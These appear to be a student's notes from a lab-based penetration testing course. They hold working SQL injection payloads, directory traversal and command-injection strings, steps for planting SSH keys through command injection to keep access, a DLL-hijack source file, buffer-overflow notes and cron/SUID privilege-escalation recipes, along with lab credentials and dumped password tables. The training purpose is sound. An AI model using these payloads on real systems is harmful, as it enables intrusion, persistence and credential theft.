

ping sweep: for i in {1..254}; do (ping -c 1 192.168.28.$i 2>&1 | grep "bytes from" &); done





http://10.50.34.125/uploads
ctfd: http://10.50.22.9:8000/
http://10.50.34.125/uploads/COSC-22-003_Day03_Notes.txt
windows: 192.168.65.10,     10.50.28.251
lin_ops: 192.168.65.20,        10.50.20.205
username: student
passwrd: password



Windows ip: 192.168.65.10, 10.50.28.251
xfreerdp /u:student /v:10.50.28.251 /dynamic-resolution +glyph-cache +clipboard
Linux ip: 192.168.65.20, 10.50.20.205


Exploitation research
Uname -a
4.15.0-76-generic #86-Ubuntu SMP Fri Jan 17 17:24:28 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux

Kernel version: 4.15.0-76


Hostnamectl - to find operating system and kernel version

cat /etc/os-* - fields to look for 
        Ex:     PRETTY_NAME=”ubuntu <date> lsb

lsb release -a

https://www.exploit-db.com/ - known exploits website



 


Scanning

Host Discovery
for i in {1..254} ;do (ping -c 1 192.168.1.$i | grep "bytes from" &) ;done

for i in {1..254} ;do (ping -c 1 192.168.28.$i | grep "bytes from" &) ;done


Host enumeration
    .1
    .3
    .10
    .20
    .30

Nmap -Pn -T5 <ip> -p-

Service interrogation
Nmap -Pn -T5 -sV <ip> -p 22

Nmap -Pn -T5 -–script banner.nse 192.168.65.10







Web Exploitation


200
2|00

function_name()
http://10.50.28.127/webexample/htmldemo.html

http://10.50.28.127/cross/XXSdemo.php

<h1 Id=”demo”

 sudo apt update -y && install nikto -y








Host Discovery
  Ping sweep

Host Enumeration
  Port scanning
  Web enum scans
  -nmap
  -nikto

Service Interrogation
          Web enumm
<script>alert(“Hello”)</script?


POST vs. GET


     Webpage
http://10.50.28.127/path/pathdemo.php


http://10.50.28.127/path/pathdemo.php?myfile=asdf&submit=File+look+up
/etc/passwd
root:x:0:0:root:/root:/bib/bash
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
Login

/etc

/bin/stuff/demo/MALISCIOUSCODEHERE

/temp

/tmp

Webpage
/temp/file1

File2
File3

../../../../../../etc/passwd
http://10.50.28.127/
Malicious File Upload -
Access/information


Can you upload?
Are file uploads sanitized?
Can you access the uploads directory?

whoami
www-data


www-data:x:33:33:www-data:/var/www:/bin/bash

Home Directory: /var/www
Login: /bin/bash

Default web Directory for web Server
/var/www/html/ = 10.50.28.127/
/var/www/html/uploads = 10.50.28.127/uploads

http://10.50.28.127/cmdinjection/cmdinjectdemo.php

Command Injection - Information/Access

; id 

SSH Keys - Persistence Access via CMDINJECT/WEBSHELL (Maliscious Upload)

Generate SSH Keys from the Workstation that yossh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCycvRpoufQkLKR/Ik/0CxjuXZbN9tXwnI9304i9P64giGeydzaYorO3B4FUYagFh/3ODl2IN18sIkcYKlAapaNHjMAReQbqoDQHmEwY3oV3H2Rru0G4XgorRzkq2Uw+r8ZyjhG/XgCtJyW9JHUOHV3K21XZCxDGihxizHi6xwdzPgsDWtKwBHfylu9N8/SrbamHQCu9PPm8mYtAF80AFhe/T1Aw4Byqd4Bhfng7oQ0jQrZq1xubImyoZ5xj3p08sHxTiReLxgUKmiwGTrQ8ozrSW1crROxVgO49gGvCxIj5RjYO8HGyvWijUHb2nnLUSeM6ieiabv3jYHo4FpE/UUYubPPrGrl4pFzq8u7KwHnKlhiswNs2+kJE1+0DG2NMQGxbP+Xu7ZIrZdZk2ffA+RouiJmoqWFhDBqBtB5W+X1KKNqdjTb78jSkDkTASBHBcDb2w5MjBxjc/H0OdqRsEmflYn/stKRxy7Beuy5iFgqdnFYe+WJtOyTyX/NE7UqKCYEEoGVCYXW3E7G+Gk6E/yOMkhSKZ7fGxipJfIwIJLCoe4Z5yv37oH63GaAnVoE4HaJme45eyS+ld+ekD3S1ic2iTd09bi4Y4mn3GzNnzsTbGcBC4fkBtx63urkA0xGwUySfbAj2qirhufTcI+i2Wru52Yx825wGBmKaaaBjZVG2Q== student@lin-ops
Via CMD INJECT / WEB SHELL

Determine who is running on the websever; whoami

www-data

Determine their home directory

; cat /etc/passwd

www-data:x:33:33:www-data:/var/www:/bin/bash

Home Directory: /var/www

Determine if .ssh directory exists
;  ls -ls /var/www

create the .ssh directory

; mkdir /var/www/.ssh

verify the creation

/ ls -la /var/www

Inject Public Key to authorized_keys file
echo “rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCycvRpoufQkLKR/Ik/0CxjuXZbN9tXwnI9304i9P64giGeydzaYorO3B4FUYagFh/3ODl2IN18sIkcYKlAapaNHjMAReQbqoDQHmEwY3oV3H2Rru0G4XgorRzkq2Uw+r8ZyjhG/XgCtJyW9JHUOHV3K21XZCxDGihxizHi6xwdzPgsDWtKwBHfylu9N8/SrbamHQCu9PPm8mYtAF80AFhe/T1Aw4Byqd4Bhfng7oQ0jQrZq1xubImyoZ5xj3p08sHxTiReLxgUKmiwGTrQ8ozrSW1crROxVgO49gGvCxIj5RjYO8HGyvWijUHb2nnLUSeM6ieiabv3jYHo4FpE/UUYubPPrGrl4pFzq8u7KwHnKlhiswNs2+kJE1+0DG2NMQGxbP+Xu7ZIrZdZk2ffA+RouiJmoqWFhDBqBtB5W+X1KKNqdjTb78jSkDkTASBHBcDb2w5MjBxjc/H0OdqRsEmflYn/stKRxy7Beuy5iFgqdnFYe+WJtOyTyX/NE7UqKCYEEoGVCYXW3E7G+Gk6E/yOMkhSKZ7fGxipJfIwIJLCoe4Z5yv37oH63GaAnVoE4HaJme45eyS+ld+ekD3S1ic2iTd09bi4Y4mn3GzNnzsTbGcBC4fkBtx63urkA0xGwUySfbAj2qirhufTcI+i2Wru52Yx825wGBmKaaaBjZVG2Q== student@lin-ops
” >> /var/www/.ssh/authorized_keys

you're logged in From 


On lin_ops 

ssh-keygen -t rsa -b 4096
cd /home/student/.ssh/
cat id_rsa.pub


nmap -Pn -script=http 10.100.28.40 - scan to find directories

ssh student@10.50.26.134 -D 9050
=http-enum.nse






sql injection

-Target databases
USE             select the DB you would like to use.
SELECT          extracts data from a database
UNION           Used to combine the result-set of two or more SELECT statements

Install sequel logged in as root - type in “mysql”


commands: show databases; - tells what databases are within that sequel server. 

do a dir to find them.


mysql - to look at authorized mysql users


type in “show tables from session;” to view the information in the different databases. To show the table of data. 

output: 
tires
car
session_log
user
userinfo


root$ Select Tires from session;

select * from session.Tires;

select tireid from session.Tires;

describe session.Tires;

select <column> from <database>.<table> UNION
select <column> from <database>.<table>;

UNION

add extra columns
Minimize columns
select carid,name,type,cost from session.car UNION select * from session.Tires;



SELECT id FROM users WHERE name='$name' AND pass='$pass';
tom’ OR 1=’1

SELECT id FROM users WHERE name-’$name’ AND pass=’$pass’;

Username: JohnDoe243
Password: pass1234








































Reverse Engineering

Will be using x86 registers

will be using “lower 32 bits” register

16 general purpose registers

%rax - register a extended - the first return register
%rbp - register base pointer
%rsp - register stack pointer

Ram can handle more complex than general purpose registers. However registers are faster.

There is one instruction pointer register that points to the memory offset of the next instruction in the code segment. holds address for next instruction to be executed

Common Instruction pointers - 3 categories

logic/arithmetic
-ADD,SUB,INC,DEC

Control-Flow
-JMP,JLE,JE,PUSH,POP

Assembly (ASM)

INSTRUCTION OPERAND2 OPERAND2

MOV EAX, EBX
MOV DST, SRC

EAX = 10
EBX = 11

MOV DST, SRC
MOV EAX, EBX |  EAX=11,  EBX=11

EAX=2,EBX=3,ECX=18
MOV DST, SRC

MOV EAX, EBX | EAX=3,EBX=3,ECX=18
MOV EBX, ECX | EAX=3,EBX=18,ECX=18
MOV ECX, EBX | EAX=3,EBX=18,ECX=18

EAX=18
PUSH EAX | EAX=18 | STACK 18



EAX=2
EBX=3

INC EAX | EAX=3
DEC EBX | EBX=2


EAX=1
EBX=3

ADD DST, SRC
ADD EAX, 10 | EAX=11
SUB EAX, 9 | EAX=2


Data Movement/Access
Arithmetic/Logic

Control Flow

cmp op1 <= op2
jmple {addr}


eax = 6
cmp eax, 7
jmple [mem addr a]

jmp = unconditional
jmp [memory address]

jmple
jmpge / jg
jmpl / jl



eax=16
ebx=16



cmp eax, ebx | 16 = 19
je [mem B]
FLAGS Register
Zero Flag 0
Sign Flag
Carry Flag


je [mem A]


mem A
inst
inst
inst




mem b
inst
inst
inst


jmple
 



main:
    mox rax, 16 | dst, src | rax=16
    push rax      | rax=16 | SP 16
    jmp mem2

mem1:
    mov rax, 0
    ret 0
mem2:
    pop r8         | rax=16,r8=16 | SP
    cmp rax, r8    | rax=16,r8=16 | SP | rax - r8 | 16-16=0
    FLAGS REGISTER: Zero Flag set
    je mem1





get method

0. behavior analysis by interacting with the website

http://10.50.25.254/uniondemo.php?Selection=2&Submit=Submit

http://10.50.25.254/uniondemo.php?Selection=2&Submit=Submit

http://10.50.25.254/uniondemo.php?Selection=2&Submit=Submit

http://10.50.25.254/uniondemo.php?Selection=2&Submit=Submit

Determine if webpage is vulnerable to sql injection via the truth statement
     
    generic truth statement (post method)

<value wrong or right>’ or 1=’1 or 1=’1
<value wrong or right>’ or 1=’1 or 1=’1;
<value wrong or right>’ or 1=’1 or 1=’1; #

Post method - send information, that get processed with the server side query

Generic truth statement (Get method)

<value wrong or right>’ or 1=1 or 1=1

http://10.50.25.254/uniondemo.php?Selection=2&

http://10.50.25.254/uniondemo.php?Selection=2
http://10.50.25.254/uniondemo.php?Selection=3
http://10.50.25.254/uniondemo.php?Selection=4



Determine the number of columns that exist from the table that the webpage is accessing/displaying
   
   http://10.50.25.254/uniondemo.php?Selection=2%20or%201=1



    columns: 3
    rows: 5

so start of with 3

http://10.50.25.254/uniondemo.php?Selection=2 or 1=1 
http://10.50.25.254/uniondemo.php?Selection=2 union select 1,2,3

columns: 3
order: 1,3,2
hidden: n/a


on the table The table on the webserver 


1 | 2 | 3

A   B   C

The webpage will display the table as such

1 | 3 | 2
A   C   B

4. Dump database information via the Golden Statemenet

  generic sql syntax

   Select <columns> From <database>.<table>

select table_schema, table_name, column_name from information_schema database


table_schema = column, list of database of databases
columns = table, this is a table inside of the information_schema database

table_schema = column, list of database names



http://10.50.25.254/uniondemo.php?Selection=2 union select 1,2,3



http://10.50.25.254/uniondemo.php?Selection=2 union select table_schema,column_name,table_name from information_schema.columns (switch column_name and table_name since they were out of order 1,3,2



duplicate the page

5. extract the desired information


goal: 

id, name, pass

from the user table

webpage to display id, name, pass



goal: 
dump this information

name,type,color

from the car table


webpage display: 

type color name







http://localhost:30480/cases/productsCategory.php?category=1%20union%20select%201,2,3

http://localhost:30480/cases/productsCategory.php?category=1%20union%20select%20table_schema,table_name,column_name%20from%20information_schema.columns


static analysis
file <filename> - determine what operating system it is for.
strings -n # <filename>

ghidra
search -> For strings -> “suc”
Enter Key:
123










Windows Exploit

0. static analysis
file
essfunc.dll - windows
secureserverind.exe - windows

strings
strings -n 5 essfunc.dll | less

Artifacts
essfunc.dll

strcpy
KERNEL32.dll
msvcrt.dll
/home/keith/builds/mingw/gcc-9.2.0-mingw32-cross-native/mingw32/libgcc
/home/keith/mingw32/include
stdio.h
(copy strings)

0. behavioral analysis

waiting on connection…
port 9999

Target: Hosting secureserver as admin:

Attack: Python > Connects to the Target > 
Exploit > payload: Reverse Shell > Privilege

!mona po 386F4337
It bring up a log data windows
highlighted in red > 2003
log data, item 8
ADDRESS=0BADF00D
Message= - Pattern 7co8 (0x386F4337) found in
cyclic pattern at position 2003

#Look at DLLs that this program needs !mona modules

#Look for jmp esp (ff e4) address to record
!mona jmp -r esp  -m “essfunc.dll”


log data, item 11
address=625012A0
Message= 0x625012a0
64




Post Exploitation



forward/local tunnel - -L <user_port_on_local>:TARGETHOST:TARGETPORT

reverse/remote tunnel - ssh USER@<PIVOT_IP> -R <REMOTE_PORT_ON_PIVOT>:TARGETHOST:TARGETPORT


logging
| tee

Obfuscation
| %{$_ -replace 'a','b' -replace 'b','c' -replace 'c','d'} > translated.out
certutil


linux - cat /etc/gshadow
/var/tmp - normally doesn’t get cleared vs. /tmp - short duration


windows 
net user guest
find /r | find “<string>”
findstr /i “<string>” <file/directory>
GUI - check hidden items and file extensions
reg query <registry_key>
get-eventlog -logname <log_name>




linux
cat /etc/hosts -find neighbors
cat /etc/resolv.conf - dns servers
cat /etc/networks
ss -ano - pulls from kernel
cat /etc/rsyslog.conf
/var/log - find logs
auth.log - authentication log
base64 -d - decode from base64
base64 -w0
/etc/passwd
/etc/shadow
sudo su root - get root privileges

Windows Exploitation
Security Descriptors - DACL, SACL, ACEs 
schtasks /create /TN RunPutty /TR "C:\Users\student\Desktop\win-priv\putty (1).exe" /ST 18:20 /RU SYSTEM /SC minute
schtasks /query  /fo LIST /V |Select-String "Task to Run" -Context 1,2
context - where to start and end the select-string
Get-Eventlog -List





#include <windows.h>
int execCommand()
{
        WinExec("cmd /C whoami > FINDME_1.txt", 1);
        return 0;
}
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
        execCommand();
        return 0;
}

Linux Exploitation

find / -type f -perm /4000 -ls 2>/dev/null - find all files with SUID bit set
/2000 - SGID bit
/6000 - SUID AND SGID bit

sudo
look at 
/var/spool/cron/crontab
/etc/crontab
if there’s a “.” in the path it’s gonna look at the current user’s path first

what to know if there’s a “.” in a user’s path what directory they’re in & and a command they’re gonna run
use world writable folders like /tmp



ssh 10.50.26.10 -L 30422:192.168.28.105:2222 -NT
ssh comrade@localhost -p 30422 -L 30423:192.168.28.27:22 -NT














Day 1 | Recon
Host Discovery
ping sweep

Host Interrogation
port scanning


nikto -h ip
if we see any ports for http/https : nmap, nsa (http-enum.nse, http-robots.txt

Service Enumeration
validating services
connecting to services

Tools:
nmap
nc
nse scripts

Day 2 | Web exploitation

    web enumeration
    nmap, nsa
    robots.txt
    legit surfing

Web Exploitation
Directory Traversal - Information
../../../../../../../../etc/passwd

CmdInjection - Information/Access
; id

Malicious Upload - webshell (bad.php)

    3. Conditions:
Can we upload? yes
Are uploads being sanitized? No
Can we access the uploads directory page? yes
SSH keys
   Generate ssh keys on the host that we will be logging in with
   place our public key in the ~/.ssh/authorized_keys file of the user’s home directory
~ = home directory
/var/www/html = google.com
var/www/htmp/map = google.com/maps

Default home directory of www-data;
/var/www

Version
nmap -sV <IP>


Day 3 \ Web exploitation - SQL 

HTTP method
GET - Requesting\Retreiving (url address bar)
POST - sending to (i.e Fields/text box)

Get Method
? = Query String parameters
parameters = View Network Tab to find the parameters

Generic SQL injection Syntax
union select <column> from <database>.<table>

Generic sql injection golden statement
union select table_schema,table_name,column_name from information_schema.columns

information_schema - database, database of databases, hold metadata about the databases

columns - table, this table existing within the information_schema database
table_schema - column, list out table names
column_name - column, list out the column names


sql injection steps
0. determine the behavior of the webpage (union select 1,2,3, #)
determine if the webpage is vulnerable via the truth statement
determine how many columns exist in the table on the webpage
determine the column number, order of columns, and what is hidden
dump the database using the golden statement
extract information
version 
UNION SELECT 1,2,@@version

day 4-6 | reverse engineering
asm
research c code
read c code

workflow
static analysis
file, strings

behavioral analysis
    procmon/procexp/other tools
dynamic analysis

disassembler/decompiler
IDA, Ghidra



Day 7-8 | Exploit Development
0. Determine the behavior of the program
0. Static Analysis
Find the offset
gdb, buffer overflow pattern generator

validate EIP with 

Crafted our exploit
-offset
-eip/jmp placeholder
-nop sled

Generate shellcode


find jmp esp from the target machine’s memory
env - gdb <program name>

7. verify exploit

-offset
-jmp esp (big endian to little endian)
-nop sled
-shellcode

Does sudo matter? yes. need to run the program as sudo to invoke root privileges


windows buffer overflow

-nc listener + windows/shell_reverse_tcp
-.dll is going to be the same


Day 9 | Post Exploitation

host
Services
processes
schedules tasks/cron
networks

Day 10 | windows priv escalation

scheduled tasks > dll hijacking, binary replacement
-determine the task to run (where the binary is being ran from)
-determine if you have write permissions where the binary is being ran from
-determine if scheduled is enabled
-determine the user running the scheduled tasks (SYSTEM)

putty
-determined what dll’s were being run “NAME NOT FOUND”
- compile the dll
-transfer the dll to the location
replace the legitimate binary with the malicious binary and ensure appropriate named being called form the task to run



services > dll hijacking, binary replacement
third-party programs w/o description
-autorun
-SYSTEM
-path to executable
–can we write to that path

replace the legit binary with the mal binary and ensure appropriate named being called from the task to run

-restart, (since you don't have permissions to restart service)

Day 11 | linux priv escalation

SUID/SGID
cron
run-parts
.in the $PATH
/etc/sudoers
sudo -l
gtfobins
/var/tmp + /tmp/


find /var/spool/cron/crontabs /etc/cron* -writable -ls # finds any cron file or directory that can be written to.

localhost:3306 = local sql database
webuser = authorized user to log into the sql database
sqlpass = password
session = database that the webpage is utilizing
$con = mysqli_connect('localhost:3306','webuser','sqlpass','session') or die(mysqli_error());

mysql –(double tack)user-webuser –pass=sqlpass

MariaDB [(none)]> select * from session.user;
+----+----------+----------+-------------------------+
| id | name     | username | pass                    |
+----+----------+----------+-------------------------+
|  1 | Aaron    | Aaron    | ncnffjbeqlCn$$jbeq      |
|  2 | user2    | user2    | RntyrfVfNER78           |
|  3 | user3    | user3    | Obo4GURRnccyrf          |
|  4 | Lee_Roth | Lroth    | anotherpassword4THEages |
+----+----------+----------+-------------------------+

../../../../../../../../../../../var/www/html/login.html


windows port 9999 - windows buffer overflow

; cat /etc/passwd | grep /var/www


find /var/spool/cron/crontabs /etc/cron* -writable -ls # finds any cron file or directory that can be written to.

\find / -type f -perm /2 -o -type d -perm /2 2>/dev/null # Search for any file or directory that is writable by the context "other"


linux priv esc steps:

cat /etc/crontab or /var/spool/cron/cronjobs
-look for user other than root
-navigate to directory (probably /tmp)
-replace crontjob file with script
-service cron restart
nc port in script
-root shell#





Day 1
Look at videos
cat /etc/os-release
lsb_release -h
lsb_release -a
uname -a
Linux lin-ops 4.15.0-76-generic #86-Ubuntu SMP Fri Jan 17 17:24:28 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux

kernel: 4.15.0-16-generic
hostnamectl
https://www.exploit-db.com/


###Scanning
Host Discovery (ping sweep)
    nmap 
    nc
   
  3) Host interrogation (Service Interrogation)

  nmap -Pn -T5 192.168.65.10 -sV -p 22,3389
  
NMAP NSE:
https://nmap.org/book/man-nse.html

NMAP NSE scripts Location:
cd /usr/share/nmap/scripts

banner.nse

cat banner.nse | less

categories = {“discovery”, “safe”}

nmap -Pn -T5 192.168.65.10 –script=banner.nse -p 22,3389
- script is 2 taks

nmap -Pn -T5 192.168.65.10 --script="discovery" -p 22,3389 go through all scripts

                    https://www.exploit-db.com/

phishing - most common way for gaining initial access


Day 2

    Web enumeration - 
GET method - http Method Request/Retrieve information
HTTP/1.1 = HTTP Version being utilized

GET /maps HTTP/1.1

/maps = www.google.com/maps

HTTP/1.1 200 OK
HTTP/1.1 = HTTP Version being utilized
200 = Status Code
OK = Status Message

Status Codes:
https://en.wikipedia.org/wiki/List_of_HTTP_Status _codes

X|XX

4|XX = Client Error
4|04 = Not Found

GET = Requesting/Retrieving Info
POST = Sending info (i.e. Login Credentials)

Forums, Email

GET = Navigate to www.gmail.com
POST = Submit username and password credentials

                Inspectors console tab (F12/right click)
inspectors - changes in inspectors tab are not persistent
Console - call functions. Write function. end with semicolon. Function must exist on website
Debugger
Network - press F5 to get data to show up.
Tabs in network tab 
        -Headers 
            -Response Headers
            -Request Headers - User agent. Figure out what OS 
requests that info. 
Right Click ‘copy as curl’
curl 'https://quotes.toscrape.com/' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:96.0) Gecko/20100101 Firefox/96.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate, br' -H 'Referer: https://www.google.com/' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' -H 'Sec-Fetch-Dest: document' -H 'Sec-Fetch-Mode: navigate' -H 'Sec-Fetch-Site: cross-site' -H 'Cache-Control: max-age=0'
        -Cookies
        -Request
        -Response
        -Timings
        -Security

wget -r -12 -P /tmp www.reddit.com
-r = recursive
-12 = Defining recursive layers
-P = /tmp

                 Limitations of wget
If you have downloaded all the necessary pages, maybe hyperlinks will work. But some links will be missing

Functions from the webpage won’t be useful. Must navigate to the website through tunnels.

curl -o example.html http://www.reddit.com/
-o = specify different destination name

Javascript (JS)


<script>
function myFunction() {
document.getElementById(“demo”).innerHTML = “Paragraph changed.”;} </script>

<a Id=”demo”>Some Text Here.</a>

Dev Console > Console Tab:
myFunction();

<a Id=”demo”>Paragraph changed.</a.>

function changeText() {
x = document.getElementById("mySelect");
x.options[x.selectedIndex].text = "Melon";
}

Select your favorite fruit:
<select id="mySelect">
  <option>Apple</option>
  <option>Orange</option>
  <option>Pineapple</option>
  <option>Banana</option>

Directory Traversal - information

../../../../../../../../../../../../../etc/passwd (right  click "view page source" for more readable output


root:x:0:0:root:/root:/bin/bash
root =user
/bin/bash = login shell
/root = home
/etc/passwd - users
/etc/group - groups/members
/etc/hosts - provide internal ip addresses the enterprise has mapped to.
/etc/resolv.conf - DNS_Server - can also tell internal ip info.
/etc/networks
http://10.50.34.125/path/pathdemo.php
http://10.50.34.125/path/pathdemo.php?
http://10.50.34.125/path/pathdemo.php?myfile
http://10.50.34.125/path/pathdemo.php?myfile=
http://10.50.34.125/path/pathdemo.php=../../../../../../../../../../etc/passwd
http://10.50.34.125/path/pathdemo.php=../../../../../../../../../../etc/passwd&submit=File+look+up


review output and fields of all these files


b. Malicious file upload (webshell) - Information/Access

can I upload? yes (.php)
Are file extensions being sanitized? No
Can you access the uploads directory? Yes


c. Command Injection - Information/Access

bb/cc. SSH Keys

upload webshell.php -> go to /uploads -> click on webshell.php

whoami
id

http://10.50.34.125/cmdinjection/cmdinjectdemo.php

“system to ping” textbox

syntax
; id
; whoami


study command injection vs directory traversal

SSH Keys
public - symmetric
private - asymmetric

Generate ssh keys
   On whichever host you plan on logging in from, generate keys
   
Your identification has been saved in /home/student/.ssh/id_rsa.
Your public key has been saved in /home/student/.ssh/id_rsa.pub.
ls -la to see .ssh directory

ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCodSqvlDi10oEJw9hp5xmTsuvWTCO30QICA0QoD8esy7zIAoAedaPVFoLLZlYoZ9uIDuIDqXY2rDdkOZffX2MLqKAxHNac8zjgEioIr8g/395Rq/R4pLnBWt3S/s4MnOlw/UpAJtOX33pCm2OS0eQTVHxg0hAvgaCo89mfeorzkq/JgHAdgfZKQTF/W/DGzlihTdcdSutCErGdX3rK4XxDEv32qOHrwKvo2O565iGrIzx7HN/vFJrdVwpaK13PEXkodcJm+EysGK4Da2gUixxnek6mfP4H/D9gpuEjSW7KWqYWivCYPnGCHZv/qy/A8Jcx4LFaedw4RIDNBgtPVzdqShTp5G/91uuqDMnneWyni5KZgQzyg3WaJFYxG1weFnh8yozEmcGLjC1ej1618EApjy6SarYbXwej/hs6kWYji1lfyLG/owNKlfcnn8Khv4cfPTzPjNmCEIHAfLATr5Z+ckziSd2z5gnDO8/MVTBhG0pyM3Zw5re9Y7rE3bx41oy+kjYeAnLYJHEEIKwOVX53KLvD2g30AbVqvhw01A86Li+3gq+EalnfzBSJOrwwnnHzE1TAUihOtnYl76UtRkh+J9/5L3TNZt1U6mOIspyIkMA6JQd7t87DRcWJLwm10ZtukaU9Zgvqnt8J3LI3fmYRDnHI2tCJ3tdbFApjdbpp+Q== student@lin-ops

2) Determine the user on the webserver. “; whoami”
Result: www-data

3) Determine the user’s home directory. “; cat /etc/passwd | grep <user>”

result: www-data:x:33:33:www-data:/var/www:/bin/bash
User: www-data
Home Directory: /var/www
Login: /bin/bash

4. Determine if .ssh/ directory exists in the users home directory, if not create it

; ls -la /var/www (if directory doesn’t exist, create directory)

5. create .ssh/ directory
; mkdir /var/www/.ssh


6. check for directory
; cat /var/www/.ssh/authorized_keys


/var/www/html = webservers default web directories
/var/www = www-data’s Home directory

Day 3

commands to run for sql

mysql (back end)
mysql –(tak tak)user=root –(tak tak)pass=password (back end)
show databases;

Default Databases:
1) information_schema = database of databases, meta data
2) mysql = configuration, user information
3) performance_schema = Status information


Custom Database:
session = Custom
show tables from <database>; (back end)
show tables from session; (back end)

Generic SQL Statement:
select <column> from <database>.<table>; (back end command)
select * from session.Tires; (back end command)
select tireid,name,size from session.Tires; (back end)
select * from session.car; (back end)

Combining Statements
1) Nesting Statements
    select * from session.car; select * from session.Tires;

2) Joining Statements
select * from session.car UNION select * from session.Tires;
car table = 4 columns
Tires = 6 columns

Adding Columns
1 | 2 | 3 | 4 | null | null |
1 | 2 | 3 | 4 |  5   |   6  |

1,2,3
null

select * from session.car UNION select *,1,2 from session.Tires;
or
select * from session.car UNION select *,null,null from session.Tires;


Removing Columns
select carid,name,type,cost from session.car UNION select * from session.Tires;


Describe command
describe <database>.<table>;
describe session.car;
Finish SQL BOLT practice


$name = [ daniel ]
$pass = [ password ]

SELECT id FROM users WHERE name ‘$name’ AND pass=’$pass’;
SELECT id FROM users WHERE name ‘daniel’ AND pass= ‘password’;


$name = [ daniel’ or 1=’1 ]
$pass = [ password’ or 1=’1 ]

SELECT id FROM users WHERE name=’danil’ or 1=’1’ AND pass=’passw0rd or 1=’1;


practice server ip: 10.50.21.144

SQL Injection - Login - Credentials

dan // thisismypassword

Query String Parameters:
username
passwd

Determine if Login page is vulnerable to SQL injection via Truth Statement

Generic Truth Statement
<value>’ or 1=’1
<value>’ or 1=’1;
<value>’ or 1=’1; #
<value>’ or 1=’1; –(tak tak)

dan’ or 1=’1 post method - sending information to the server
“welcome comradeadmin”
what did we determine?
1. vulnerable to SQL Injection
2. admin is a user

2. Exploit vulnerable Login page (GET Method) w/ Truth Statement

http://10.50.21.144/login.php

What are the Query String Parameters?
username
passwd

http://10.50.21.144/login.php
http://10.50.21.144/login.php? (? means query string parameters to follow)
http://10.50.21.144/login.php?username
http://10.50.21.144/login.php?username=
http://10.50.21.144/login.php?username=dan’ or 1=’1
http://10.50.21.144/login.php?username=dan’ or 1=’1&
http://10.50.21.144/login.php?username=dan’ or 1=’1&passwd=dan’ or 1=’1

http://10.50.21.144/Union.html
SQL Injetion - Webpages - POST Method
0. Behavior Analysis

SQL Injection - Webpages - GET Method

Generic Truth Statement (POST)

Ford' or 1='1
Ford' or 1=1;
Ford' or 1='1; #
Ford' or 1='1; --


Audi' or 1='1 #works
Audi' or 1='1; #works
Audi' or 1='1; # #works
Audi' or 1='1; --#works




Manufacturer
Cost
Color
Year
Ford
45000
white
2017
Dodge
38000
blue
2017
Honda
42000
red
2015
Audi
22000
red
2134




Rows: = 5
Columns: 4 <===Lowest

We start with the lowest number

Audi' or 1='1;

SQL Injection - Webpages - GET Method

Audi' UNION select 1,2,3,4 #No
Audi' UNION select 1,2,3,4; #No
Audi' UNION select 1,2,3,4; # #No
Audi' UNION select 1,2,3,4; -- #No


Audi' UNION select 1,2,3,4,5; # #works

Manufacturer
Cost
Color
Year
Audi
22000
red
2134
1
3
4
5




3. Determine the number of columns, the order, and if there are any hidden columns.

Columns: 5
Order: 1,3,4,5
hidden: column 2

Display Order: 1,3,4,5
Backend Order: 1,2,3,4,5

4. Dumping/Extracting information via Golden Statement

Audi’ UNION select 1,2,3,4,5; # #Works

Generic SQL Statement
select <column> from <database>.<table>


Generic Golden Statement

UNION select table_schema,table_name,column_name from information_schema.columns

columns = table, that exist inside the information schema

table_schema = column inside the columns table, list out database names

table_name = column inside the columns table, list out the tables names

column_name = column inside the columns table, list out the column names

Audi’ UNION select table_schema,2,table_name,column_name,5 from information_schema.columns; #

5. Extract desired information id,name,pass session
Audi' UNION select id,2,name,pass,5 from session.user; #

Manufacturer
Cost
Color
Year
Audi
22000
red
2134
0
admin
�o�H
5
1
Luke_Skywalker
Jedi
5
2
Darth_Vader
Sith
5
3
c3p0
annoying
5
4
Batman
BWyane
5



https://pauljerimy.com/security-certification-roadmap/

marine corps - “COOL”

GET METHOD
0. Behavior analysis

http://10.50.21.144/uniondemo.php?Selection=1&Submit=Submit
http://10.50.21.144/uniondemo.php?Selection=2&Submit=Submit
http://10.50.21.144/uniondemo.php?Selection=3&Submit=Submit
http://10.50.21.144/uniondemo.php?Selection=4&Submit=Submit

Determine vulnerable webpage via Truth Statement

Generic Truth Statement (GET)
<value> or 1=1
etc 

http://10.50.21.144/uniondemo.php?Selection=1&Submit=Submit or 1=1 #No

http://10.50.21.144/uniondemo.php?Selection=3%20or%201=1 #works
http://10.50.21.144/uniondemo.php?Selection=3%20or%201=1;
http://10.50.21.144/uniondemo.php?Selection=3%20or%201=1; #
http://10.50.21.144/uniondemo.php?Selection=3%20or%201=1; –(tak tak)

3. Determine number columns, the order, and if there are any hidden columns.
columns: 3
Display Order; 1,3,2
Hidden: N/A

Backend Order:
1 | 2 | 3

webpage Order:
1 | 3 | 2

4. Dumping/Extracting information via Golden Statement

Generic SQL Statements
select <column> from <database>.<table>

generic golden statement

http://10.50.21.144/uniondemo.php?Selection=2 UNION select table_schema,table_name,column_name from information_schema.columns

Backend Order:
table_schema | table_name | column_name

webpage Display Order:

table_schema | column_name | table_name

switch order:

http://10.50.21.144/uniondemo.php?Selection=2 UNION select table_schema,column_name,table_name from information_schema.columns

5. Extract Desired information
name,type,year
session
car

http://10.50.21.144/uniondemo.php?Selection=2 UNION select name,type,year from session.car




SQL Injection - Filtering (WHERE)
http://10.50.21.144/uniondemo.php?Selection=2 UNION select table_schema,column_name,table_name from information_schema.columns where table_schema=’session’

SQL Injection - Functions (LOAD_FILE())


http://10.50.21.144/uniondemo.php?Selection=2 UNION select 1,2,load_file(‘/etc/passwd’)

/etc/passwd
/etc/group
/etc/hosts
/etc/resolv.conf


SQL Injection - SQL Version (@@version)

http://10.50.21.144/uniondemo.php?Selection=2 UNION select 1,2,@@version

10.1.48-MariaDB-0ubuntu0.18.04.1

https://dev/mysql.com/doc/refman/8.0/en/string-literals.html



Day 4


